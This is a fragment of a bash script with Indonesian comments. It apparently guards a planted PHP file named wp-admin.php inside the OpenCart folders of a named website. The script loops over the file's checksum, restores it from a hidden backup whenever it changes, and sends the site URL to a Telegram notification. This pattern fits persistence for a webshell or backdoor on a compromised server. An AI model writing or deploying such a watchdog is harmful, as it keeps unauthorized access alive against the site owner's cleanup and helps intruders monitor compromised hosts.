...
INDEX_FILE="/home/mooiwts234/domains/vliegeruit.com/public_html/catalog/controller/account/wp-admin.php"
# Definisikan lokasi folder backup Permissions 755
BACKUP_FOLDER="/home/mooiwts234/domains/vliegeruit.com/public_html/catalog/controller/information"
...
monitor_file() {
    while true; do
        ...
        if [ "$CURRENT_CHECKSUM" != "$BACKUP_CHECKSUM" ]; then
            ...
            echo "https://vliegeruit.com/catalog/controller/account/wp-admin.php."
            send_telegram_notification "https://vliegeruit.com/catalog/controller/account/wp-admin.php. File wp-admin.php Sudah dikembalikan ke versi backup." # UBAH JADI NAMA FILE/DOMAIN. UBAH JADI NAMA FILE/DOMAIN YG DI KEMBALIKAN
        fi
